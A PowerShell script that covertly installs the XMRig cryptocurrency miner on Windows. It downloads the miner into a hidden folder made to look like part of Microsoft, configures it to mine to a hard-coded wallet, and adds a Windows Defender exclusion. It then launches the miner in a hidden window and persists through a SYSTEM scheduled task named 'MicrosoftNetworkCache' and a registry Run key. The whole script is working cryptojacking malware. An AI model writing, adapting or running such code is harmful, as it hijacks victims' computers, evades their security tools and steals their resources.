# XMRig FINAL v12 - CMD wrapper + debug real + no BOM
$InstallDir = "C:\ProgramData\Microsoft\Network\Cache"
if (-not (Test-Path $InstallDir)) {
    New-Item -Path $InstallDir -ItemType Directory -Force | Out-Null
    (Get-Item $InstallDir).Attributes += "Hidden"
}

# Limpieza total
Remove-Item "$InstallDir\*" -Force -Recurse -ErrorAction SilentlyContinue

# Descarga y extracción
$ZipUrl = "https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-windows-x64.zip"
$ZipPath = "$env:TEMP\xmrig-v12.zip"
Invoke-WebRequest -Uri $ZipUrl -OutFile $ZipPath -UseBasicParsing -TimeoutSec 60
Expand-Archive -Path $ZipPath -DestinationPath $InstallDir -Force
Remove-Item $ZipPath -Force

$Sub = Get-ChildItem $InstallDir -Directory | Where-Object { $_.Name -like "*xmrig*" } | Select-Object -First 1
if ($Sub) {
    Move-Item "$($Sub.FullName)\*" $InstallDir -Force
    Remove-Item $Sub.FullName -Recurse -Force
}

$ExePath = (Get-ChildItem $InstallDir -Recurse -Filter "xmrig.exe" -File | Select-Object -First 1).FullName
$ConfigPath = "$InstallDir\config.json"
$BatPath = "$InstallDir\start.bat"

# Config SIN BOM (ASCII) + log obligatorio
$ConfigJson = @'
{
  "autosave": false,
  "colors": false,
  "cpu": { "enabled": true, "max-threads-hint": 60 },
  "donate-level": 0,
  "log-file": "xmr.log",
  "pools": [{
    "algo": "rx/0",
    "url": "pool.supportxmr.com:443",
    "user": "86ai84R8527XLKGjipKuW6YSjpwnevaGESZWnW1kEnpJVnmLLVUTd2PC2hDu8e9oDLYtWK9xGhysd89Mxq1rNZkoQR5DnNd",
    "pass": "x",
    "keepalive": true,
    "tls": true,
    "rig-id": "$env:COMPUTERNAME"
  }],
  "print-time": 60
}
'@
[System.IO.File]::WriteAllText($ConfigPath, $ConfigJson, [System.Text.Encoding]::ASCII)

# BAT con debug REAL (para saber exactamente qué pasa)
"@echo off
echo BAT STARTED %date% %time% > xmr.log
cd /d `"$InstallDir`"
echo Directorio actual: %cd% >> xmr.log
echo Ejecutando xmrig... >> xmr.log
start /B xmrig.exe -c config.json -B --no-color >> xmr.log 2>&1
echo Comando ejecutado >> xmr.log" | Out-File $BatPath -Encoding ASCII -Force

# Exclusión Defender
try { Add-MpPreference -ExclusionPath $InstallDir -ErrorAction SilentlyContinue } catch {}

# Arrancar ya
Start-Process -FilePath "cmd.exe" -ArgumentList "/c `"$BatPath`"" -WindowStyle Hidden

# Persistencia (cmd.exe /c bat = método infalible)
$TaskName = "MicrosoftNetworkCache"
$Action = New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c `"$BatPath`""
$Trigger = New-ScheduledTaskTrigger -AtStartup
try {
    $Principal = New-ScheduledTaskPrincipal -UserId "NT AUTHORITY\SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger $Trigger -Principal $Principal -Force | Out-Null
} catch {
    Register-ScheduledTask -TaskName $TaskName -Action $Action -Trigger (New-ScheduledTaskTrigger -AtLogOn) -Force | Out-Null
}

# Fallback Registry
Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $TaskName -Value "cmd.exe /c `"$BatPath`"" -Force
